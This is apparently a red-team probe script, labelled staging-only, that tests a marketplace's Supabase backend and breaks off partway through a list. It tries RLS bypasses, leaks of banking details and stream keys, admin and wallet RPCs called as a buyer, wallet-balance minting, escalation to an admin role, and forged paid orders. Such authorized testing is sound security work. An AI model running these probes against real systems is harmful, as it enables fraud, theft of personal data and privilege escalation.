#!/usr/bin/env python3
"""Blind independent Red Team probe — staging only. No production. No fixes.

Usage (from repo root):
  python tool/redteam_blind_indep_20260829T1914/probe.py
"""
from __future__ import annotations

import json
import os
import sys
import time
import uuid
from concurrent.futures import ThreadPoolExecutor, as_completed
from datetime import datetime, timezone
from pathlib import Path
from typing import Any
from urllib.error import HTTPError, URLError
from urllib.request import Request, urlopen

ROOT = Path(__file__).resolve().parents[2]
ENV_PATH = ROOT / "tool" / "live_ops_staging.env"
OUT_DIR = Path(__file__).resolve().parent / "out"
STAMP = datetime.now(timezone.utc).strftime("%Y%m%dT%H%M%SZ")
RUN_ID = f"rt_blind_{STAMP}_{uuid.uuid4().hex[:8]}"

# ---------------------------------------------------------------------------
# HTTP
# ---------------------------------------------------------------------------


def load_env(path: Path) -> dict[str, str]:
    out: dict[str, str] = {}
    for line in path.read_text(encoding="utf-8").splitlines():
        t = line.strip()
        if not t or t.startswith("#") or "=" not in t:
            continue
        k, v = t.split("=", 1)
        out[k.strip()] = v.strip()
    return out


def norm_url(raw: str) -> str:
    u = raw.strip().rstrip("/")
    for suf in ("/rest/v1", "/auth/v1", "/functions/v1"):
        if u.endswith(suf):
            u = u[: -len(suf)].rstrip("/")
    return u


def http(
    method: str,
    url: str,
    headers: dict[str, str],
    body: Any | None = None,
    timeout: int = 45,
) -> dict[str, Any]:
    data = None
    hdrs = dict(headers)
    if body is not None and method not in ("GET", "HEAD", "DELETE"):
        data = json.dumps(body).encode("utf-8")
        hdrs.setdefault("Content-Type", "application/json")
    req = Request(url, data=data, headers=hdrs, method=method)
    try:
        with urlopen(req, timeout=timeout) as resp:
            raw = resp.read()
            text = raw.decode("utf-8", "replace")
            parsed: Any
            try:
                parsed = json.loads(text) if text else None
            except json.JSONDecodeError:
                parsed = text
            return {
                "http": resp.status,
                "body": parsed,
                "text": text[:8000],
                "headers": {k.lower(): v for k, v in resp.headers.items()},
            }
    except HTTPError as e:
        raw = e.read()
        text = raw.decode("utf-8", "replace")
        parsed: Any
        try:
            parsed = json.loads(text) if text else None
        except json.JSONDecodeError:
            parsed = text
        return {
            "http": e.code,
            "body": parsed,
            "text": text[:8000],
            "headers": {k.lower(): v for k, v in e.headers.items()} if e.headers else {},
        }
    except URLError as e:
        return {"http": 0, "body": None, "text": str(e), "headers": {}}


def first_row(body: Any) -> dict[str, Any] | None:
    if isinstance(body, list) and body:
        row = body[0]
        return row if isinstance(row, dict) else None
    if isinstance(body, dict):
        return body
    return None


# ---------------------------------------------------------------------------
# Result log
# ---------------------------------------------------------------------------

RESULTS: list[dict[str, Any]] = []


def rec(
    surface: str,
    attack: str,
    identity: str,
    result: str,
    impact: str,
    severity: str,
    evidence: Any,
    finding: bool = False,
) -> None:
    row = {
        "surface": surface,
        "attack": attack,
        "identity": identity,
        "result": result,
        "impact": impact,
        "severity": severity,
        "finding": finding,
        "evidence": evidence,
        "ts": datetime.now(timezone.utc).isoformat(),
    }
    RESULTS.append(row)
    flag = "FINDING" if finding else "OK"
    print(f"[{flag}] {severity:3} {identity:8} {surface:22} {attack} → {result}")


# ---------------------------------------------------------------------------
# Main
# ---------------------------------------------------------------------------


def main() -> int:
    env = load_env(ENV_PATH)
    url = norm_url(env["SUPABASE_URL"])
    anon = env["SUPABASE_ANON_KEY"]
    svc = env["SUPABASE_SERVICE_ROLE_KEY"]
    buyer_id = env["LIVE_OPS_TEST_BUYER_ID"]
    seller_id = env["LIVE_OPS_TEST_SELLER_ID"]
    assert "fxdknzrqjenzqcvnwqqq" in url
    OUT_DIR.mkdir(parents=True, exist_ok=True)

    ANON = {
        "apikey": anon,
        "Authorization": f"Bearer {anon}",
        "Content-Type": "application/json",
        "Prefer": "return=representation",
    }
    SVC = {
        "apikey": svc,
        "Authorization": f"Bearer {svc}",
        "Content-Type": "application/json",
        "Prefer": "return=representation",
    }

    def sign_in(email: str, password: str) -> str:
        r = http(
            "POST",
            f"{url}/auth/v1/token?grant_type=password",
            {"apikey": anon, "Content-Type": "application/json"},
            {"email": email, "password": password},
        )
        if r["http"] >= 400 or not isinstance(r["body"], dict):
            raise SystemExit(f"signIn failed {r['http']}: {r['text'][:400]}")
        tok = r["body"].get("access_token") or ""
        if not tok:
            raise SystemExit("no access_token")
        return tok

    buyer_tok = sign_in(env["LIVE_OPS_TEST_BUYER_EMAIL"], env["LIVE_OPS_TEST_BUYER_PASSWORD"])
    seller_tok = sign_in(env["LIVE_OPS_TEST_SELLER_EMAIL"], env["LIVE_OPS_TEST_SELLER_PASSWORD"])
    BH = {
        "apikey": anon,
        "Authorization": f"Bearer {buyer_tok}",
        "Content-Type": "application/json",
        "Prefer": "return=representation",
    }
    SH = {
        "apikey": anon,
        "Authorization": f"Bearer {seller_tok}",
        "Content-Type": "application/json",
        "Prefer": "return=representation",
    }

    def rest(method: str, path: str, headers: dict[str, str], body: Any | None = None) -> dict[str, Any]:
        return http(method, f"{url}/rest/v1/{path}", headers, body)

    def rpc(fn: str, params: dict[str, Any], headers: dict[str, str]) -> dict[str, Any]:
        return http("POST", f"{url}/rest/v1/rpc/{fn}", headers, params)

    def edge(fn: str, headers: dict[str, str], body: Any | None = None, qs: str = "", method: str = "POST") -> dict[str, Any]:
        u = f"{url}/functions/v1/{fn}"
        if qs:
            u += f"?{qs}"
        return http(method, u, headers, body)

    def observe(table: str, filt: str, limit: int = 5) -> Any:
        return rest("GET", f"{table}?{filt}&limit={limit}", SVC).get("body")

    def r_short(resp: dict[str, Any]) -> str:
        return (resp.get("text") or "")[:280]

    oid: str | None = None
    order_legit: str | None = None
    off_id: str | None = None
    o5id: str | None = None

    # Disposable attacker (no pre-existing wallet assumed)
    disp_email = f"rtblind.{int(time.time())}.{uuid.uuid4().hex[:6]}@staging.fleaber.bot"
    disp_pass = "RtBlind_" + uuid.uuid4().hex[:12] + "!"
    created = http(
        "POST",
        f"{url}/auth/v1/admin/users",
        SVC,
        {
            "email": disp_email,
            "password": disp_pass,
            "email_confirm": True,
            "user_metadata": {"role": "buyer", "probe": RUN_ID},
        },
    )
    disp_id = ""
    if isinstance(created["body"], dict):
        disp_id = str(created["body"].get("id") or "")
    rec(
        "AUTH",
        "create_disposable_user_fixture",
        "service_role",
        "created" if disp_id else "FAIL",
        "fixture only",
        "INFO",
        {"http": created["http"], "id": disp_id, "email": disp_email},
    )
    disp_tok = sign_in(disp_email, disp_pass) if disp_id else ""
    DH = {
        "apikey": anon,
        "Authorization": f"Bearer {disp_tok}",
        "Content-Type": "application/json",
        "Prefer": "return=representation",
    } if disp_tok else {}

    # Ensure seller/buyer profiles exist (observe)
    for uid, label in ((buyer_id, "buyer"), (seller_id, "seller")):
        p = rest("GET", f"profiles?id=eq.{uid}&select=id,user_type,mb_way,iban", SVC)
        rec("AUTH/PROFILES", f"observe_{label}_profile", "service_role", "ok", "observe", "INFO", {"http": p["http"], "n": len(p["body"]) if isinstance(p["body"], list) else 0})

    # =====================================================================
    # PASS 1 — coverage
    # =====================================================================

    # OpenAPI inventory
    oa = http(
        "GET",
        f"{url}/rest/v1/",
        {**ANON, "Accept": "application/openapi+json"},
    )
    paths = []
    if isinstance(oa["body"], dict):
        paths = sorted(oa["body"].get("paths", {}).keys())
    rec("RPC/RLS", "openapi_anon_paths", "anon", f"n={len(paths)}", "inventory", "INFO", {"n": len(paths), "sample": paths[:40]})
    (OUT_DIR / "openapi_anon_paths.json").write_text(json.dumps(paths, indent=2), encoding="utf-8")

    oa_b = http(
        "GET",
        f"{url}/rest/v1/",
        {**BH, "Accept": "application/openapi+json"},
    )
    b_paths = []
    if isinstance(oa_b["body"], dict):
        b_paths = sorted(oa_b["body"].get("paths", {}).keys())
    rec("RPC/RLS", "openapi_buyer_paths", "buyer", f"n={len(b_paths)}", "inventory", "INFO", {"n": len(b_paths)})
    (OUT_DIR / "openapi_buyer_paths.json").write_text(json.dumps(b_paths, indent=2), encoding="utf-8")

    rpc_names = [p.split("/rpc/")[-1] for p in b_paths if "/rpc/" in p]
    rec("RPC", "rpc_list_authenticated", "buyer", f"n={len(rpc_names)}", "inventory", "INFO", rpc_names)

    tables = [
        "orders",
        "products",
        "wallets",
        "wallet_transactions",
        "wallet_payout_ledger",
        "reviews",
        "order_disputes",
        "chats",
        "chat_messages",
        "lives",
        "live_items",
        "live_reservation_requests",
        "live_tips",
        "live_raffles",
        "live_raffle_winners",
        "live_messages",
        "profiles",
        "notifications",
        "notifications_view",
        "product_offers",
        "product_bundles",
        "seller_bundle_discounts",
        "favorites",
        "follows",
        "seller_device_tokens",
        "stripe_checkout_events",
        "app_logs",
        "order_proofs",
        "seller_staff",
        "hub_profiles_public",
        "ps_ingest_audit",
        "ps_pairing_codes",
        "seller_direct_payment_details",
    ]

    # Anon SELECT
    for t in tables:
        r = rest("GET", f"{t}?select=*&limit=3", ANON)
        leaked = r["http"] == 200 and isinstance(r["body"], list) and len(r["body"]) > 0
        sensitive = t in {
            "wallets",
            "wallet_transactions",
            "wallet_payout_ledger",
            "chats",
            "chat_messages",
            "order_disputes",
            "lives",
            "orders",
            "profiles",
            "seller_device_tokens",
            "stripe_checkout_events",
            "app_logs",
        }
        rec(
            "RLS",
            f"anon_select_{t}",
            "anon",
            f"http={r['http']} n={len(r['body']) if isinstance(r['body'], list) else 'na'}",
            "data leak" if leaked and sensitive else "public-or-empty",
            "P1" if leaked and sensitive else "INFO",
            {"http": r["http"], "n": len(r["body"]) if isinstance(r["body"], list) else None, "sample_keys": list(r["body"][0].keys())[:20] if leaked else None},
            finding=bool(leaked and sensitive),
        )

    # Stream keys via explicit column
    for ident, hdr in (("anon", ANON), ("buyer", BH), ("seller", SH)):
        r = rest("GET", "lives?select=id,mux_stream_key,stream_key,mux_live_id&limit=3", hdr)
        leaked_keys = False
        if r["http"] == 200 and isinstance(r["body"], list):
            for row in r["body"]:
                for k in ("mux_stream_key", "stream_key"):
                    if row.get(k):
                        leaked_keys = True
        rec(
            "LIVE/MUX",
            "select_stream_keys",
            ident,
            f"http={r['http']} leaked={leaked_keys} text={r['text'][:180]}",
            "stream key leak" if leaked_keys else "blocked_or_empty",
            "P1" if leaked_keys else "INFO",
            {"http": r["http"], "body": r["body"] if r["http"] != 200 else r["body"]},
            finding=leaked_keys,
        )

    # Cross-user SELECT
    for t, filt in (
        ("orders", f"buyer_id=eq.{seller_id}"),
        ("orders", f"seller_id=eq.{seller_id}"),
        ("chats", f"or=(user_a.eq.{seller_id},user_b.eq.{seller_id})"),
        ("wallets", f"id=eq.{seller_id}"),
        ("wallet_transactions", f"wallet_id=eq.{seller_id}"),
        ("reviews", "select=*&limit=5"),
        ("order_disputes", "select=*&limit=5"),
        ("live_tips", "select=*&limit=5"),
        ("profiles", f"id=eq.{seller_id}&select=id,user_type,mb_way,iban,email,phone"),
    ):
        path = t if "select=" in filt else f"{t}?{filt}&select=*&limit=8"
        if "select=" in filt and t not in filt:
            path = f"{t}?{filt}&limit=8"
        r = rest("GET", path if "?" in path else f"{t}?{filt}&select=*&limit=8", BH)
        rec("PRIVACY", f"buyer_select_{t}", "buyer", f"http={r['http']} n={len(r['body']) if isinstance(r['body'], list) else 'na'}", "cross-user?", "INFO", {"http": r["http"], "n": len(r["body"]) if isinstance(r["body"], list) else None, "head": (r["body"][:1] if isinstance(r["body"], list) else r["text"][:200])})

    # IBAN/MB WAY on profiles as other user
    r = rest("GET", f"profiles?id=eq.{seller_id}&select=id,mb_way,iban,user_type,display_name,full_name", BH)
    iban = None
    mb = None
    if isinstance(r["body"], list) and r["body"]:
        iban = r["body"][0].get("iban")
        mb = r["body"][0].get("mb_way")
    rec(
        "PRIVACY",
        "buyer_read_seller_iban_mbway",
        "buyer",
        f"http={r['http']} iban={bool(iban)} mb={bool(mb)}",
        "PII banking" if (iban or mb) else "null_or_blocked",
        "P1" if (iban or mb) else "INFO",
        {"http": r["http"], "iban_present": bool(iban), "mb_present": bool(mb), "row": r["body"][:1] if isinstance(r["body"], list) else r["text"][:300]},
        finding=bool(iban or mb),
    )

    # Banking oracle RPC
    r = rpc("batata_seller_direct_payment_details", {"p_seller_id": seller_id}, BH)
    rec(
        "PRIVACY",
        "rpc_banking_without_offplatform_order",
        "buyer",
        f"http={r['http']} body={r['text'][:240]}",
        "IBAN oracle",
        "P1" if r["http"] == 200 and r["body"] not in (None, [], {}) else "INFO",
        r,
        finding=bool(r["http"] == 200 and r["body"] not in (None, [], {})),
    )
    r = rpc("batata_seller_direct_payment_details", {"p_seller_id": seller_id}, ANON)
    rec("PRIVACY", "rpc_banking_anon", "anon", f"http={r['http']}", "anon banking", "INFO", r)

    # Email enum
    r = rpc("batata_find_user_id_by_email", {"p_email": env["LIVE_OPS_TEST_SELLER_EMAIL"]}, BH)
    rec("PRIVACY", "email_enum_as_buyer", "buyer", f"http={r['http']} body={r['text'][:200]}", "user enum", "P2" if (r["http"] == 200 and r["body"]) else "INFO", r, finding=bool(r["http"] == 200 and r["body"]))
    r = rpc("batata_find_user_id_by_email", {"p_email": env["LIVE_OPS_TEST_BUYER_EMAIL"]}, SH)
    rec("PRIVACY", "email_enum_as_seller", "seller", f"http={r['http']} body={r['text'][:200]}", "seller staff helper", "P2" if (r["http"] == 200 and r["body"]) else "INFO", r)

    # Admin RPC
    for fn, params in (
        ("batata_is_admin", {}),
        ("batata_lab_clear_all_fm_pending", {}),
        ("batata_generate_auto_feedback", {}),
        ("batata_wallet_apply_tip_once", {"p_wallet_id": buyer_id, "p_tip_id": str(uuid.uuid4()), "p_amount": 50, "p_type": "gorjeta_recebida", "p_description": "x"}),
        ("batata_credit_wallet_once", {"p_wallet_id": buyer_id, "p_order_id": str(uuid.uuid4()), "p_amount": 99, "p_type": "venda", "p_description": "x"}),
        ("batata_wallet_payout_debit", {"p_user_id": buyer_id, "p_amount_cents": 100, "p_idempotency_key": "rtblind" + uuid.uuid4().hex[:12]}),
        ("batata_settle_live_tip_from_stripe", {"p_tip_id": str(uuid.uuid4()), "p_session_id": "cs_test_x", "p_amount_cents": 500}),
        ("batata_finalize_stripe_order_refund", {"p_order_id": str(uuid.uuid4())}),
    ):
        r = rpc(fn, params, BH)
        privileged = r["http"] == 200 and r["body"] not in (None, False, [])
        rec(
            "RPC",
            f"buyer_call_{fn}",
            "buyer",
            f"http={r['http']} body={str(r['body'])[:180]}",
            "privileged RPC",
            "P0" if privileged and "wallet" in fn else ("P1" if privileged else "INFO"),
            r,
            finding=bool(privileged and "lab" in fn or privileged and "wallet" in fn or privileged and "settle" in fn or privileged and "payout" in fn),
        )

    # Wallet mint
    if DH:
        # Observe existing wallet
        before = rest("GET", f"wallets?id=eq.{disp_id}&select=*", SVC)
        r = rest("POST", "wallets", DH, {"id": disp_id, "balance": 99999.12, "stripe_account_id": "acct_attacker"})
        after = rest("GET", f"wallets?id=eq.{disp_id}&select=*", SVC)
        minted = False
        bal = None
        row = first_row(after.get("body") if isinstance(after, dict) else after)
        # after is dict from rest
        if isinstance(after["body"], list) and after["body"]:
            bal = after["body"][0].get("balance")
            try:
                minted = float(bal) >= 1000
            except (TypeError, ValueError):
                minted = False
        rec(
            "WALLET",
            "jwt_insert_wallet_balance",
            "disp_buyer",
            f"insert_http={r['http']} bal={bal} insert_body={r['text'][:240]}",
            "JWT mint" if minted else "blocked_or_zeroed",
            "P0" if minted else "INFO",
            {"insert": r, "before": before["body"], "after": after["body"]},
            finding=minted,
        )
        r = rest("PATCH", f"wallets?id=eq.{disp_id}", DH, {"balance": 88888.5})
        after2 = rest("GET", f"wallets?id=eq.{disp_id}&select=id,balance", SVC)
        bal2 = None
        if isinstance(after2["body"], list) and after2["body"]:
            bal2 = after2["body"][0].get("balance")
        patched = False
        try:
            patched = float(bal2 or 0) >= 1000
        except (TypeError, ValueError):
            patched = False
        rec(
            "WALLET",
            "jwt_patch_wallet_balance",
            "disp_buyer",
            f"http={r['http']} bal={bal2}",
            "JWT mint via UPDATE" if patched else "blocked",
            "P0" if patched else "INFO",
            {"patch": r, "after": after2["body"]},
            finding=patched,
        )
        r = rest("POST", "wallet_transactions", DH, {"wallet_id": disp_id, "amount": 500, "type": "venda", "description": "mint"})
        rec("WALLET", "jwt_insert_wallet_tx", "disp_buyer", f"http={r['http']}", "ledger mint", "P0" if r["http"] < 300 else "INFO", r, finding=r["http"] < 300)
        r = rest("POST", "wallet_payout_ledger", DH, {"user_id": disp_id, "amount_cents": 5000, "status": "transferred", "idempotency_key": "x" * 12})
        rec("PAYOUT", "jwt_insert_payout_ledger", "disp_buyer", f"http={r['http']}", "fake payout row", "P1" if r["http"] < 300 else "INFO", r, finding=r["http"] < 300)

    # Existing buyer wallet patch
    r = rest("PATCH", f"wallets?id=eq.{buyer_id}", BH, {"balance": 77777})
    after_b = rest("GET", f"wallets?id=eq.{buyer_id}&select=id,balance", SVC)
    rec("WALLET", "buyer_patch_own_balance", "buyer", f"http={r['http']} after={after_b['body']}", "mint", "INFO", {"patch": r, "after": after_b["body"]})

    r = rest("PATCH", f"wallets?id=eq.{seller_id}", BH, {"balance": 1})
    rec("WALLET", "buyer_patch_seller_wallet", "buyer", f"http={r['http']}", "cross-user wallet", "P0" if r["http"] < 300 else "INFO", r, finding=r["http"] < 300)

    # RPCs wallet as buyer on own/other
    r = rpc("batata_ensure_wallet", {"p_user_id": seller_id}, BH)
    rec("WALLET", "ensure_wallet_other_user", "buyer", f"http={r['http']} body={r['text'][:180]}", "cross ensure", "P3" if r["http"] == 200 else "INFO", r)
    r = rpc("batata_release_seller_wallet_for_order", {"p_order_id": str(uuid.uuid4())}, BH)
    rec("WALLET", "release_random_order", "buyer", f"http={r['http']} body={r['text'][:180]}", "release", "INFO", r)
    r = rpc("batata_refund_buyer_wallet_for_order", {"p_order_id": str(uuid.uuid4())}, SH)
    rec("WALLET", "refund_wallet_random", "seller", f"http={r['http']}", "refund", "INFO", r)
    r = rpc("batata_send_live_tip_from_wallet", {"p_live_id": None, "p_seller_id": seller_id, "p_amount": 1, "p_message": "rt"}, BH)
    rec("TIPS", "wallet_tip_null_live", "buyer", f"http={r['http']} body={r['text'][:220]}", "tip without live", "INFO", r)
    r = rpc("batata_send_live_tip_from_wallet", {"p_live_id": None, "p_seller_id": seller_id, "p_amount": 999999, "p_message": "rt"}, BH)
    rec("TIPS", "wallet_tip_huge", "buyer", f"http={r['http']} body={r['text'][:220]}", "over-debit", "INFO", r)
    r = rpc("batata_create_live_tip_pending", {"p_live_id": None, "p_seller_id": seller_id, "p_amount": 5, "p_message": "x", "p_stripe_session_id": "cs_test_forged"}, BH)
    rec("TIPS", "create_pending_tip_forged_session", "buyer", f"http={r['http']} body={r['text'][:220]}", "forged session bind", "INFO", r)

    # user_type elevation
    r = rest("PATCH", f"profiles?id=eq.{buyer_id}", BH, {"user_type": "admin"})
    after_p = rest("GET", f"profiles?id=eq.{buyer_id}&select=id,user_type", SVC)
    ut = None
    if isinstance(after_p["body"], list) and after_p["body"]:
        ut = after_p["body"][0].get("user_type")
    rec(
        "AUTH",
        "buyer_patch_user_type_admin",
        "buyer",
        f"http={r['http']} user_type={ut}",
        "admin escalate",
        "P0" if str(ut).lower() in ("admin", "admim", "administrador") else "INFO",
        {"patch": r, "after": after_p["body"]},
        finding=str(ut).lower() in ("admin", "admim", "administrador"),
    )
    r = rest("PATCH", f"profiles?id=eq.{buyer_id}", BH, {"user_type": "vendedor"})
    after_p2 = rest("GET", f"profiles?id=eq.{buyer_id}&select=id,user_type", SVC)
    rec("AUTH", "buyer_patch_user_type_seller", "buyer", f"http={r['http']} after={after_p2['body']}", "seller escalate", "INFO", {"patch": r, "after": after_p2["body"]})

    # Fixtures: product qty=1 and qty=5
    stamp = int(time.time() * 1000)
    prod1 = rest(
        "POST",
        "products",
        SVC,
        {
            "seller_id": seller_id,
            "title": f"RT-BLIND stock1 {stamp}",
            "price": 12.5,
            "quantity": 1,
            "list_on_marketplace": True,
            "available_for_live": False,
            "is_sold": False,
            "ref_code": f"RTB1-{stamp}",
        },
    )
    prod5 = rest(
        "POST",
        "products",
        SVC,
        {
            "seller_id": seller_id,
            "title": f"RT-BLIND stock5 {stamp}",
            "price": 8.0,
            "quantity": 5,
            "list_on_marketplace": True,
            "available_for_live": False,
            "is_sold": False,
            "ref_code": f"RTB5-{stamp}",
        },
    )
    p1 = first_row(prod1["body"])
    p5 = first_row(prod5["body"])
    p1_id = (p1 or {}).get("id")
    p5_id = (p5 or {}).get("id")
    rec("STOCK", "fixture_products", "service_role", f"p1={p1_id} p5={p5_id}", "fixture", "INFO", {"p1": prod1["http"], "p5": prod5["http"]})

    def insert_order(hdr: dict[str, str], extra: dict[str, Any]) -> dict[str, Any]:
        body = {
            "buyer_id": buyer_id,
            "seller_id": seller_id,
            "product_id": p1_id,
            "status": "reserva_pendente",
            "quantity": 1,
            "payment_method": "Seguro Fleaber",
            "shipping_method": "hand",
        }
        body.update(extra)
        return rest("POST", "orders", hdr, body)

    # Buyer order insert attacks
    if p1_id:
        r = insert_order(BH, {"price_total": 0.01, "contract_unit_cents": 1, "quantity": 1})
        row = first_row(r["body"])
        rec(
            "PRICE/CONTRACT",
            "buyer_insert_low_price_total_and_contract",
            "buyer",
            f"http={r['http']} contract={None if not row else row.get('contract_unit_cents')} price_total={None if not row else row.get('price_total')} qty={None if not row else row.get('quantity')}",
            "client price authority",
            "P1" if row and int(row.get("contract_unit_cents") or 0) < 100 else "INFO",
            r,
            finding=bool(row and int(row.get("contract_unit_cents") or 0) < 100 and float(row.get("price_total") or 0) < 1),
        )
        # keep this order id if created
        order_a = row.get("id") if row else None

        r = insert_order(BH, {"price_total": 0.5, "payment_method": "proposta aceite", "quantity": 1})
        row = first_row(r["body"])
        rec(
            "PRICE/CONTRACT",
            "buyer_insert_proposta_low_total",
            "buyer",
            f"http={r['http']} contract={None if not row else row.get('contract_unit_cents')} pt={None if not row else row.get('price_total')} pm={None if not row else row.get('payment_method')}",
            "proposta alias price cut",
            "P1" if row and int(row.get("contract_unit_cents") or 1250) < 500 else "INFO",
            r,
            finding=bool(row and int(row.get("contract_unit_cents") or 0) < 500),
        )

        r = insert_order(BH, {"quantity": 99})
        rec("QUANTITY", "buyer_insert_qty99_stock1", "buyer", f"http={r['http']} {r['text'][:200]}", "oversell insert", "P1" if r["http"] < 300 else "INFO", r, finding=r["http"] < 300)

        r = insert_order(BH, {"quantity": -1})
        rec("QUANTITY", "buyer_insert_qty_neg", "buyer", f"http={r['http']}", "neg qty", "INFO", r)
        r = insert_order(BH, {"quantity": 0})
        rec("QUANTITY", "buyer_insert_qty0", "buyer", f"http={r['http']}", "zero qty", "INFO", r)
        r = insert_order(BH, {"quantity": 1.7})
        rec("QUANTITY", "buyer_insert_qty_float", "buyer", f"http={r['http']} {r['text'][:180]}", "float qty", "INFO", r)

        r = insert_order(BH, {"status": "pago", "amount_paid_cents": 99999, "stripe_payment_intent_id": "pi_fake", "stripe_checkout_session_id": "cs_fake"})
        row = first_row(r["body"])
        rec(
            "ORDERS",
            "buyer_insert_pago_with_stripe_ids",
            "buyer",
            f"http={r['http']} status={None if not row else row.get('status')} paid={None if not row else row.get('amount_paid_cents')} pi={None if not row else row.get('stripe_payment_intent_id')}",
            "fake capture",
            "P0" if row and (row.get("status") == "pago" or (row.get("amount_paid_cents") or 0) > 0 or row.get("stripe_payment_intent_id")) else "INFO",
            r,
            finding=bool(row and (row.get("status") == "pago" or (row.get("amount_paid_cents") or 0) or row.get("stripe_payment_intent_id"))),
        )

        r = insert_order(BH, {"status": "premio_rifa", "live_raffle_id": str(uuid.uuid4()), "price_total": 0})
        row = first_row(r["body"])
        rec(
            "RAFFLES",
            "buyer_insert_premio_rifa",
            "buyer",
            f"http={r['http']} status={None if not row else row.get('status')} contract={None if not row else row.get('contract_unit_cents')}",
            "fake prize",
            "P1" if row and row.get("status") == "premio_rifa" else "INFO",
            r,
            finding=bool(row and str(row.get("status")) == "premio_rifa"),
        )

        r = insert_order(BH, {"buyer_id": seller_id})
        rec("AUTHORITY", "buyer_insert_order_as_other_buyer", "buyer", f"http={r['http']} {r['text'][:200]}", "attribution swap", "P1" if r["http"] < 300 else "INFO", r, finding=r["http"] < 300)

        r = insert_order(SH, {"buyer_id": buyer_id, "status": "reservado"})
        row = first_row(r["body"])
        rec(
            "AUTHORITY",
            "seller_insert_order_for_buyer_no_offer",
            "seller",
            f"http={r['http']} {r['text'][:240]} status={None if not row else row.get('status')}",
            "ghost sale",
            "P1" if r["http"] < 300 else "INFO",
            r,
            finding=r["http"] < 300,
        )

        # Legitimate buyer order for checkout tests
        r = insert_order(BH, {"product_id": p1_id, "quantity": 1, "shipping_method": "hand"})
        legit = first_row(r["body"])
        order_legit = (legit or {}).get("id")
        rec("ORDERS", "fixture_buyer_order_stock1", "buyer", f"http={r['http']} id={order_legit} contract={None if not legit else legit.get('contract_unit_cents')}", "fixture", "INFO", r)

        if order_legit:
            # PATCH attacks
            for field, val in (
                ("price_total", 0.01),
                ("contract_unit_cents", 1),
                ("contract_qty", 99),
                ("quantity", 9),
                ("amount_paid_cents", 1),
                ("stripe_payment_intent_id", "pi_buyer"),
                ("status", "pago"),
                ("status", "concluido"),
                ("status", "entregue"),
                ("buyer_id", seller_id),
                ("seller_id", buyer_id),
                ("product_id", p5_id),
                ("payment_method", "MB WAY"),
            ):
                r = rest("PATCH", f"orders?id=eq.{order_legit}", BH, {field: val})
                after = rest("GET", f"orders?id=eq.{order_legit}&select=id,status,price_total,contract_unit_cents,contract_qty,quantity,amount_paid_cents,stripe_payment_intent_id,buyer_id,seller_id,product_id,payment_method", SVC)
                rec("ORDER FSM", f"buyer_patch_{field}_{val}", "buyer", f"http={r['http']}", "client authority", "INFO", {"patch_http": r["http"], "after": after["body"], "err": r["text"][:160]})

            # seller platform pago
            r = rest("PATCH", f"orders?id=eq.{order_legit}", SH, {"status": "pago"})
            after = rest("GET", f"orders?id=eq.{order_legit}&select=id,status,amount_paid_cents", SVC)
            st = None
            if isinstance(after["body"], list) and after["body"]:
                st = after["body"][0].get("status")
            rec(
                "ORDER FSM",
                "seller_mark_pago_platform_payment",
                "seller",
                f"http={r['http']} status={st}",
                "fake platform pay",
                "P1" if st == "pago" else "INFO",
                {"patch": r, "after": after["body"]},
                finding=st == "pago",
            )

        # Off-platform collusion pago
        r = insert_order(BH, {"product_id": p5_id, "payment_method": "MB WAY", "status": "reserva_pendente"})
        off = first_row(r["body"])
        off_id = (off or {}).get("id")
        rec("ORDERS", "fixture_mbway_order", "buyer", f"id={off_id} http={r['http']}", "fixture", "INFO", r)
        if off_id:
            r = rest("PATCH", f"orders?id=eq.{off_id}", SH, {"status": "pago"})
            after = rest("GET", f"orders?id=eq.{off_id}&select=id,status,amount_paid_cents,stock_units_applied,quantity", SVC)
            rec("ORDER FSM", "seller_mark_pago_mbway", "seller", f"http={r['http']} after={after['body']}", "off-platform attest", "INFO", {"patch": r, "after": after["body"]})
            # try logistics
            r = rest("PATCH", f"orders?id=eq.{off_id}", SH, {"status": "enviado"})
            rec("ORDER FSM", "seller_mbway_enviado", "seller", f"http={r['http']}", "logistics", "INFO", r)
            r = rest("PATCH", f"orders?id=eq.{off_id}", BH, {"status": "concluido"})
            after = rest("GET", f"orders?id=eq.{off_id}&select=id,status,wallet_release_processed_at,amount_paid_cents", SVC)
            rec("ORDER FSM", "buyer_concluido_after_mbway", "buyer", f"http={r['http']} after={after['body']}", "wallet release path", "INFO", {"patch": r, "after": after["body"]})
            r = rpc("batata_release_seller_wallet_for_order", {"p_order_id": off_id}, BH)
            wal = rest("GET", f"wallets?id=eq.{seller_id}&select=id,balance", SVC)
            rec(
                "WALLET",
                "release_after_mbway_without_capture",
                "buyer",
                f"rpc={r['http']} body={r['text'][:160]} wallet={wal['body']}",
                "mint from off-platform",
                "P0" if r["http"] == 200 and r["body"] is True else "INFO",
                {"rpc": r, "wallet": wal["body"], "order": after["body"]},
                finding=False,  # need delta; filled later if balance jumped
            )

        # Catalog mutation after seal
        if order_legit and p1_id:
            r = rest("PATCH", f"products?id=eq.{p1_id}", SH, {"price": 0.5})
            rec("CATALOG", "seller_drop_price_after_order", "seller", f"http={r['http']}", "retro contract", "INFO", r)
            ck = edge(
                "create-payment-intent",
                BH,
                {
                    "buyer_id": buyer_id,
                    "order_id": order_legit,
                    "product_id": p1_id,
                    "seller_id": seller_id,
                    "amount": 1,
                    "quantity": 1,
                    "item_price": 0.01,
                    "shipping_method": "hand",
                    "shipping": 0,
                    "protection_fee": 0,
                },
            )
            rec(
                "CHECKOUT",
                "session_after_catalog_price_drop_client_amount_1",
                "buyer",
                f"http={ck['http']} body={r_short(ck)}",
                "price authority",
                "INFO",
                ck,
            )
            # restore price for later
            rest("PATCH", f"products?id=eq.{p1_id}", SVC, {"price": 12.5})

    # Checkout identity attacks
    if p1_id:
        r = insert_order(BH, {"product_id": p1_id})
        o = first_row(r["body"])
        oid = (o or {}).get("id")
        if oid:
            for attack, body in (
                ("anon_checkout", None),
                ("other_buyer_id", {"buyer_id": seller_id, "order_id": oid, "shipping_method": "hand"}),
                ("prize_shipping_false_prize", {"buyer_id": buyer_id, "order_id": oid, "prize_shipping": True, "shipping_method": "carrier"}),
                ("qty99", {"buyer_id": buyer_id, "order_id": oid, "quantity": 99, "shipping_method": "hand", "amount": 1}),
                ("amount1", {"buyer_id": buyer_id, "order_id": oid, "amount": 1, "shipping_method": "hand"}),
                ("garbage_shipping", {"buyer_id": buyer_id, "order_id": oid, "shipping_method": "gratis"}),
                ("hand_to_skip_carrier_fee", {"buyer_id": buyer_id, "order_id": oid, "shipping_method": "hand"}),
                ("wrong_product", {"buyer_id": buyer_id, "order_id": oid, "product_id": p5_id, "shipping_method": "hand"}),
